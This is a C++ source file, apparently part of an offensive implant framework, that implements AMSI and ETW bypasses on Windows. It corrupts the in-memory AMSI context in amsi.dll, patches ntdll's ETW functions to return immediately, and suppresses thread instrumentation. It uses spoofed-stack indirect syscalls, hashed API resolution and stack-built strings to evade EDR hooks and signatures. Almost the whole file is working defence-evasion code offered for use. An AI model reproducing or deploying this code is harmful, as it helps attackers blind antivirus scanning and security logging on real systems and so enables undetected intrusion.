// ============================================================================
// AMSI/ETW Bypass — Implementation
// ============================================================================
//
// AMSI bypass is entirely data-only — no code patches, no VirtualProtect,
// no debug registers. We corrupt the AMSI context structure in amsi.dll's
// writable heap memory. This is fundamentally different from patching
// AmsiScanBuffer (which every EDR signatures now).
//
// ETW bypass patches EtwEventWrite/Ex and NtTraceEvent stubs in ntdll.
// The memory protection change uses our indirect syscalls (Tartarus +
// SyscallManager + CallContext) so EDR hooks on VirtualProtect and
// NtProtectVirtualMemory never see the permission change.
//
// All API resolution via PEB walking with compile-time hashes.
// ============================================================================

#include "amsi_etw.h"
#include "config.h"
#include "peb_lookup.h"
#include "hashing.h"
#include "tartarus.h"
#include "syscall_manager.h"
#include "call_context.h"

#include <intrin.h>

namespace AmsiEtw {

    // ========================================================================
    // Spoofed syscall helper
    // ========================================================================

    static inline void SpoofBegin() {
        CallContext::g_spoof_ret   = CallContext::GetLegitimateReturnAddress();
        CallContext::g_proxy_frame = nullptr;
    }

    static inline void SpoofEnd() {
        CallContext::g_spoof_ret   = nullptr;
        CallContext::g_proxy_frame = nullptr;
    }

    // ========================================================================
    // AMSI Bypass — Three-Layer Zero-Patch Context Corruption
    // ========================================================================
    //
    // The AMSI context struct (amsi.dll internal, reverse-engineered):
    //
    //   offset 0x00: DWORD  Signature    = 0x49534D41 ('AMSI')
    //   offset 0x04: DWORD  Padding
    //   offset 0x08: PVOID  Providers    (linked list head / array ptr)
    //   offset 0x10: DWORD  SessionCount
    //
    // Layer 1: Corrupt Signature  → AmsiScanBuffer returns AMSI_RESULT_CLEAN
    // Layer 2: Zero Providers ptr → no providers to invoke
    // Layer 3: Overflow SessionCount → AmsiOpenSession fails
    //
    // All three are data-only writes to amsi.dll's own heap memory.
    // No code patches. No VirtualProtect. No debug registers.
    // Indistinguishable from normal heap writes to any monitor.

    static const DWORD AMSI_MAGIC = 0x49534D41; // 'AMSI'

    // Force-load amsi.dll so the context is guaranteed to exist
    static HMODULE ForceLoadAmsi() {
        HMODULE hAmsi = Resolver::GetModuleByHash(HASH_MODULE(L"amsi.dll"));
        if (hAmsi) return hAmsi;

        // Not loaded yet — force it via LoadLibraryA
        HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
        if (!hK32) return nullptr;

        typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
        auto pLoadLib = (LoadLibraryA_t)Resolver::GetExportByHash(hK32, HASH_API("LoadLibraryA"));
        if (!pLoadLib) return nullptr;

        // Build "amsi.dll" on the stack — no string literal in .rdata
        char name[] = { 'a','m','s','i','.','d','l','l', 0 };
        return pLoadLib(name);
    }

    // Scan a memory region for the AMSI magic DWORD and corrupt it
    static BYTE* FindAndCorruptContext(BYTE* base, DWORD size) {
        for (DWORD off = 0; off + 0x14 <= size; off += sizeof(PVOID)) {
            DWORD* candidate = (DWORD*)(base + off);
            if (*candidate != AMSI_MAGIC) continue;

            // Validate: providers pointer at +0x08 should be non-NULL userspace
            PVOID* providers = (PVOID*)(base + off + 0x08);
            DWORD* sessions  = (DWORD*)(base + off + 0x10);

            ULONG_PTR provVal = (ULONG_PTR)*providers;
            if (provVal == 0 || provVal > 0x00007FFFFFFFFFFF) continue;

            // Layer 1: Corrupt the magic signature
            // XOR with tick-derived value so corruption varies per execution
            // (avoids static signature on the corrupt value itself)
            typedef DWORD(WINAPI* GetTickCount_t)();
            HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
            auto pTick = (GetTickCount_t)Resolver::GetExportByHash(hK32, HASH_API("GetTickCount"));
            DWORD tick = pTick ? pTick() : 0x12345678;
            volatile DWORD corrupt = AMSI_MAGIC ^ (tick | 1);
            *candidate = corrupt;

            // Layer 2: Decapitate the provider list
            // Zero the providers pointer so AmsiScanBuffer thinks
            // no providers are registered
            *providers = nullptr;

            // Layer 3: Overflow the session counter
            // Set to 0xFFFFFFFF so next AmsiOpenSession increment
            // overflows to 0, causing session validation to fail
            *sessions = 0xFFFFFFFF;

            return base + off;
        }
        return nullptr;
    }

    static bool RunAmsiBypass() {
        HMODULE hAmsi = ForceLoadAmsi();
        if (!hAmsi) {
            LOG("AMSI: amsi.dll not present — bypass not needed");
            return true; // No AMSI = nothing to bypass
        }

        // Walk amsi.dll PE sections — scan writable, non-executable sections
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hAmsi;
        IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)((BYTE*)hAmsi + dos->e_lfanew);
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            DWORD chars = sec[i].Characteristics;
            if (!(chars & IMAGE_SCN_MEM_WRITE)) continue;
            if (chars & IMAGE_SCN_MEM_EXECUTE) continue;

            BYTE* base = (BYTE*)hAmsi + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;

            if (FindAndCorruptContext(base, size)) {
                LOG_SUCCESS("AMSI: Context corrupted (3-layer: sig+providers+session)");
                return true;
            }
        }

        // Fallback: context might be heap-allocated outside PE sections
        // or in .bss which may not have WRITE flag in header but is writable
        DWORD imageSize = nt->OptionalHeader.SizeOfImage;
        if (FindAndCorruptContext((BYTE*)hAmsi, imageSize)) {
            LOG_SUCCESS("AMSI: Context corrupted (full image scan fallback)");
            return true;
        }

        LOG("AMSI: Context not found (non-fatal)");
        return true; // Non-fatal — AMSI might not be active
    }

    // ========================================================================
    // ETW Bypass — Stub Patching + TEB Suppression
    // ========================================================================
    //
    // Layer 1: Patch EtwEventWrite, EtwEventWriteEx, NtTraceEvent
    //          to "xor eax, eax; ret" (return STATUS_SUCCESS).
    //          Memory protection changed via indirect syscall through
    //          our full engine (Tartarus SSN + trampoline + spoofed stack).
    //
    // Layer 2: Per-thread TEB instrumentation callback suppression.

    static bool PatchEtwFunction(BYTE* funcAddr) {
        if (!funcAddr) return false;

        // Already patched? (idempotent)
        if (funcAddr[0] == 0x31 && funcAddr[1] == 0xC0 && funcAddr[2] == 0xC3)
            return true;

        // Get NtProtectVirtualMemory syscall
        const Tartarus::SyscallEntry* pProtect = Tartarus::GetSyscall(
            HASH_API("NtProtectVirtualMemory"));
        if (!pProtect) {
            LOG_ERROR("ETW: NtProtectVirtualMemory SSN not available");
            return false;
        }

        // Make page writable via indirect syscall with spoofed stack
        PVOID page = (PVOID)funcAddr;
        SIZE_T pageSize = 4096;
        ULONG oldProt = 0;

        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            pProtect->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)(HANDLE)-1,
            (ULONG_PTR)&page,
            (ULONG_PTR)&pageSize,
            (ULONG_PTR)PAGE_EXECUTE_READWRITE,
            (ULONG_PTR)&oldProt);
        SpoofEnd();

        if (!NT_SUCCESS(status)) {
            LOG_ERROR("ETW: NtProtectVirtualMemory failed: 0x%08X", status);
            return false;
        }

        // Write patch: xor eax, eax; ret (3 bytes)
        // Makes the function return STATUS_SUCCESS (0) immediately
        funcAddr[0] = 0x31;  // xor
        funcAddr[1] = 0xC0;  // eax, eax
        funcAddr[2] = 0xC3;  // ret

        // Restore original protection
        page = (PVOID)funcAddr;
        pageSize = 4096;
        ULONG dummy = 0;

        SpoofBegin();
        DoSyscallSpoofed(
            pProtect->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)(HANDLE)-1,
            (ULONG_PTR)&page,
            (ULONG_PTR)&pageSize,
            (ULONG_PTR)oldProt,
            (ULONG_PTR)&dummy);
        SpoofEnd();

        return true;
    }

    static bool SuppressThreadEtw() {
        // TEB+0x1720: InstrumentationCallbackDisabled
        // Setting to 1 suppresses instrumentation callbacks for this thread
        BYTE* teb = (BYTE*)__readgsqword(0x30);
        if (!teb) return false;

        volatile BYTE* instrDisable = (volatile BYTE*)(teb + 0x1720);
        *instrDisable = 1;
        return true;
    }

    static int RunEtwBypass(bool& tebOk) {
        int patched = 0;

        HMODULE hNtdll = Resolver::GetModuleByHash(HASH_MODULE(L"ntdll.dll"));
        if (!hNtdll) {
            LOG_ERROR("ETW: ntdll not found");
            return 0;
        }

        // Patch EtwEventWrite — primary event writing function
        BYTE* pWrite = (BYTE*)Resolver::GetExportByHash(hNtdll, HASH_API("EtwEventWrite"));
        if (pWrite && PatchEtwFunction(pWrite)) {
            patched++;
            LOG_SUCCESS("ETW: EtwEventWrite patched");
        }

        // Patch EtwEventWriteEx — extended event writing
        BYTE* pWriteEx = (BYTE*)Resolver::GetExportByHash(hNtdll, HASH_API("EtwEventWriteEx"));
        if (pWriteEx && PatchEtwFunction(pWriteEx)) {
            patched++;
            LOG_SUCCESS("ETW: EtwEventWriteEx patched");
        }

        // Patch NtTraceEvent — low-level syscall wrapper for ETW
        BYTE* pTrace = (BYTE*)Resolver::GetExportByHash(hNtdll, HASH_API("NtTraceEvent"));
        if (pTrace && PatchEtwFunction(pTrace)) {
            patched++;
            LOG_SUCCESS("ETW: NtTraceEvent patched");
        }

        // Layer 2: Per-thread TEB suppression
        tebOk = SuppressThreadEtw();
        if (tebOk) LOG_SUCCESS("ETW: Thread-level suppression active (TEB+0x1720)");

        return patched;
    }

    // ========================================================================
    // Public entry point
    // ========================================================================

    BypassResult Run() {
        BypassResult result = {};

        LOG("AMSI/ETW: Running bypass");

        // AMSI — zero-patch context corruption
        result.AmsiSuccess = RunAmsiBypass();

        // ETW — stub patching + TEB suppression
        result.EtwFunctionsPatched = RunEtwBypass(result.TebSuppressed);
        result.EtwSuccess = (result.EtwFunctionsPatched > 0) || result.TebSuppressed;

        LOG("AMSI/ETW: Complete (AMSI=%s, ETW=%d patched, TEB=%s)",
            result.AmsiSuccess ? "OK" : "FAIL",
            result.EtwFunctionsPatched,
            result.TebSuppressed ? "OK" : "FAIL");

        return result;
    }

} // namespace AmsiEtw
